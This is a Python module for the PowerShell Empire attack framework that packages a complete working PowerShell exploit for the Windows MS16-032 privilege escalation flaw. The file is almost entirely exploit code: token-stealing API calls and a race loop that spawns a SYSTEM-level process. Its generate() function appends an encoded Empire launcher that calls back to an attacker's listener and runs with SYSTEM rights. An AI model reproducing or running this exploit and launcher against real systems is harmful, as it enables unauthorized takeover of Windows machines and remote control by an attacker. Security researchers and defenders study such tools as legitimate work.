from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MS16-032',

            'Author': ['@tiraniddo', '@Fuzzysec', '@benichmt1','@sammbertram'],

            'Description': ("Empire port for MS16-032. "
            "In order for the race condition to succeed the machine must have 2+ CPU"),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'MinPSVersion' : '2',
            
            'Comments': [
              'https://warroom.securestate.com/leveraging-ms16-032-powershell-empire/'
              'https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1'
              'https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html'
              'https://www.exploit-db.com/exploits/39574/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other). Set to none for length requirements of the payload',
                'Required'      :   False,
                'Value'         :   'none'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            } 
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        script = """
function Invoke-MS16-032 {
<#
.SYNOPSIS
    
    PowerShell implementation of MS16-032. The exploit targets all vulnerable
    operating systems that support PowerShell v2+. Credit for the discovery of
    the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
    
    Targets:
    
    * Win7-Win10 & 2k8-2k12 <== 32/64 bit!
    * Tested on x32 Win7, x64 Win8, x64 2k12R2
    
    Notes:
    
    * In order for the race condition to succeed the machine must have 2+ CPU
      cores. If testing in a VM just make sure to add a core if needed mkay.
    * Want to know more about MS16-032 ==>
      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	Blog: http://www.fuzzysecurity.com/
	License: BSD 3-Clause
	Required Dependencies: PowerShell v2+
	Optional Dependencies: None
    
.EXAMPLE
	C:\PS> Invoke-MS16-032
#>
	param (
		[Parameter(Mandatory = $True)]
		[string]$Command
	
	)  
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SQOS
	{
		public int Length;
		public int ImpersonationLevel;
		public int ContextTrackingMode;
		public bool EffectiveOnly;
	}
	
	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
		public static extern bool CreateProcessWithLogonW(
			String userName,
			String domain,
			String password,
			int logonFlags,
			String applicationName,
			String commandLine,
			int creationFlags,
			int environment,
			String currentDirectory,
			ref  STARTUPINFO startupInfo,
			out PROCESS_INFORMATION processInformation);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool SetThreadToken(
			ref IntPtr Thread,
			IntPtr Token);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenThreadToken(
			IntPtr ThreadHandle,
			int DesiredAccess,
			bool OpenAsSelf,
			out IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public extern static bool DuplicateToken(
			IntPtr ExistingTokenHandle,
			int SECURITY_IMPERSONATION_LEVEL,
			ref IntPtr DuplicateTokenHandle);
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentProcess();
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentThread();
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern int GetThreadId(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetProcessIdOfThread(IntPtr handle);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int SuspendThread(IntPtr hThread);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool TerminateProcess(
			IntPtr hProcess,
			uint uExitCode);
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CloseHandle(IntPtr hObject);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool DuplicateHandle(
			IntPtr hSourceProcessHandle,
			IntPtr hSourceHandle,
			IntPtr hTargetProcessHandle,
			ref IntPtr lpTargetHandle,
			int dwDesiredAccess,
			bool bInheritHandle,
			int dwOptions);
	}
	
	public static class Ntdll
	{
		[DllImport("ntdll.dll", SetLastError=true)]
		public static extern int NtImpersonateThread(
			IntPtr ThreadHandle,
			IntPtr ThreadToImpersonate,
			ref SQOS SecurityQualityOfService);
	}
"@
	
	function Get-ThreadHandle {
		# StartupInfo Struct
		$StartupInfo = New-Object STARTUPINFO
		$StartupInfo.dwFlags = 0x00000100 # STARTF_USESTDHANDLES
		$StartupInfo.hStdInput = [Kernel32]::GetCurrentThread()
		$StartupInfo.hStdOutput = [Kernel32]::GetCurrentThread()
		$StartupInfo.hStdError = [Kernel32]::GetCurrentThread()
		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
		
		# ProcessInfo Struct
		$ProcessInfo = New-Object PROCESS_INFORMATION
		
		# CreateProcessWithLogonW --> lpCurrentDirectory
		$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
		
		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, $env:COMSPEC, "",
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo)
		
		# Duplicate handle into current process -> DUPLICATE_SAME_ACCESS
		$lpTargetHandle = [IntPtr]::Zero
		$CallResult = [Kernel32]::DuplicateHandle(
			$ProcessInfo.hProcess, 0x4,
			[Kernel32]::GetCurrentProcess(),
			[ref]$lpTargetHandle, 0, $false,
			0x00000002)
		
		# Clean up suspended process
		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
		
		$lpTargetHandle
	}
	
	function Get-SystemToken {
		echo "`n[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($hThread))).ProcessName)"
	
		$CallResult = [Kernel32]::SuspendThread($hThread)
		if ($CallResult -ne 0) {
			echo "[!] $hThread is a bad thread, exiting.."
			Return
		} echo "[+] Thread suspended"
		
		echo "[>] Wiping current impersonation token"
		$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, [IntPtr]::Zero)
		if (!$CallResult) {
			echo "[!] SetThreadToken failed, exiting.."
			$CallResult = [Kernel32]::ResumeThread($hThread)
			echo "[+] Thread resumed!"
			Return
		}
		
		echo "[>] Building SYSTEM impersonation token"
		# SecurityQualityOfService struct
		$SQOS = New-Object SQOS
		$SQOS.ImpersonationLevel = 2 #SecurityImpersonation
		$SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS)
		# Undocumented API's, I like your style Microsoft ;)
		$CallResult = [Ntdll]::NtImpersonateThread($hThread, $hThread, [ref]$sqos)
		if ($CallResult -ne 0) {
			echo "[!] NtImpersonateThread failed, exiting.."
			$CallResult = [Kernel32]::ResumeThread($hThread)
			echo "[+] Thread resumed!"
			Return
		}
		
		# Null $SysTokenHandle
		$script:SysTokenHandle = [IntPtr]::Zero

		# 0x0006 --> TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE
		$CallResult = [Advapi32]::OpenThreadToken($hThread, 0x0006, $false, [ref]$SysTokenHandle)
		if (!$CallResult) {
			echo "[!] OpenThreadToken failed, exiting.."
			$CallResult = [Kernel32]::ResumeThread($hThread)
			echo "[+] Thread resumed!"
			Return
		}
		
		echo "[?] Success, open SYSTEM token handle: $SysTokenHandle"
		echo "[+] Resuming thread.."
		$CallResult = [Kernel32]::ResumeThread($hThread)
	}
	
	# main() <--- ;)
	$ms16032 = @"
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]
"@
	
	$ms16032
	
	# Check logical processor count, race condition requires 2+
	echo "`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
	if ($([System.Environment]::ProcessorCount) -lt 2) {
		echo "[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"
		Return
	}
	
	echo "[>] Duplicating CreateProcessWithLogonW handle"
	$hThread = Get-ThreadHandle
	
	# If no thread handle is captured, the box is patched
	if ($hThread -eq 0) {
		echo "[!] No valid thread handle was captured, exiting!`n"
		Return
	} else {
		echo "[?] Done, using thread handle: $hThread"
	} echo "`n[*] Sniffing out privileged impersonation token.."
	
	# Get handle to SYSTEM access token
	Get-SystemToken
	
	# If we fail a check in Get-SystemToken, exit
	if ($SysTokenHandle -eq 0) {
		Return
	}
	
	echo "`n[*] Sniffing out SYSTEM shell.."
	echo "`n[>] Duplicating SYSTEM token"
	$hDuplicateTokenHandle = [IntPtr]::Zero
	$CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle)
	
	# Simple PS runspace definition
	echo "[>] Starting token race"
	$Runspace = [runspacefactory]::CreateRunspace()
	$StartTokenRace = [powershell]::Create()
	$StartTokenRace.runspace = $Runspace
	$Runspace.Open()
	[void]$StartTokenRace.AddScript({
		Param ($hThread, $hDuplicateTokenHandle)
		while ($true) {
			$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, $hDuplicateTokenHandle)
		}
	}).AddArgument($hThread).AddArgument($hDuplicateTokenHandle)
	$AscObj = $StartTokenRace.BeginInvoke()
	
	echo "[>] Starting process race"
	# Adding a timeout (10 seconds) here to safeguard from edge-cases
	$SafeGuard = [diagnostics.stopwatch]::StartNew()
	while ($SafeGuard.ElapsedMilliseconds -lt 10000) {

		# StartupInfo Struct
		$StartupInfo = New-Object STARTUPINFO
		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
		
		# ProcessInfo Struct
		$ProcessInfo = New-Object PROCESS_INFORMATION
		
		# CreateProcessWithLogonW --> lpCurrentDirectory
		$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
		
		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, $env:COMSPEC, "/s /c `"$Command`"",
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo)
		
		#---
		# Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.
		#---
		# Missing this check used to cause the exploit to fail sometimes.
		# If CreateProcessWithLogon fails OpenProcessToken won't succeed
		# but we obviously don't have a SYSTEM shell :'( . Should be 100%
		# reliable now!
		#---
		if (!$CallResult) {
			continue
		}
			
		$hTokenHandle = [IntPtr]::Zero
		$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
		# If we can't open the process token it's a SYSTEM shell!
		if (!$CallResult) {
			echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
			$StartTokenRace.Stop()
			$SafeGuard.Stop()
			Return
		}
			
		# Clean up suspended process
		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)

	}
	
	# Kill runspace & stopwatch if edge-case
	$StartTokenRace.Stop()
	$SafeGuard.Stop()
} """

        listenerName = self.options['Listener']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set

            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
            
            if launcher == "":
                print helpers.color("[!] Error in launcher generation.")
                return ""
            else:
                # The CreateProcessLogonW function only accepts 1024 chars!
                if len(launcher) > 1024:
                    print helpers.color("[!] The launcher payload is greater than 1024 chars. Try setting User-Agent and proxy settings to 'none' to shrink the payload.")
                    return ""
             
                script += 'Invoke-MS16-032 -Command "%s"' % launcher
                return script
